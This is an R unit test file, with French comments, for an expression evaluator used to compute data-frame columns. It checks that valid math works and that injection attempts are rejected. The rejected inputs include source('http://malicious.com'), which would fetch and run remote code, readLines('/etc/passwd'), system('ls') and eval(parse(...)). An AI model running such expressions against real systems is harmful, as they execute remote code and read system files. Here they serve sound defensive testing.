# ==============================================================================
# Tests unitaires : Securite des expressions et calculs de variables
# Fichier : tests/testthat/test-data-prep-security.R
# ==============================================================================

testthat::context("Securite des variables calculees et filtres Ramses")

testthat::test_that("ramses_prep_compute autorise les calculs mathematiques valides", {
  df <- data.frame(
    prix = c(100, 200, 300),
    qte = c(2, 5, 10),
    stringsAsFactors = FALSE
  )

  # Arithmetique standard
  res1 <- ramses_prep_compute(df, "total", "prix * qte")
  testthat::expect_equal(res1$df$total, c(200, 1000, 3000))
  testthat::expect_match(res1$code, "with\\(dataset, prix \\* qte\\)")

  # Fonctions mathematiques autorisees
  res2 <- ramses_prep_compute(df, "log_prix", "log(prix) + sqrt(qte)")
  testthat::expect_equal(res2$df$log_prix, log(c(100, 200, 300)) + sqrt(c(2, 5, 10)))
})

testthat::test_that("ramses_prep_compute bloque strictement les injections de code et fonctions dangereuses", {
  df <- data.frame(a = 1:5, b = 6:10)

  # Blocage system()
  testthat::expect_error(
    ramses_prep_compute(df, "bad", "system('ls')"),
    "non autoris"
  )

  # Blocage eval(parse(...))
  testthat::expect_error(
    ramses_prep_compute(df, "bad", "eval(parse(text='1+1'))"),
    "non autoris"
  )

  # Blocage source()
  testthat::expect_error(
    ramses_prep_compute(df, "bad", "source('http://malicious.com')"),
    "non autoris"
  )

  # Blocage assign()
  testthat::expect_error(
    ramses_prep_compute(df, "bad", "assign('x', 99)"),
    "non autoris"
  )

  # Blocage acces a des variables globales ou hors dataframe
  testthat::expect_error(
    ramses_prep_compute(df, "bad", "a + col_inexistante"),
    "Symbole non autoris"
  )

  # Blocage acces aux fichiers
  testthat::expect_error(
    ramses_prep_compute(df, "bad", "readLines('/etc/passwd')"),
    "non autoris"
  )
})
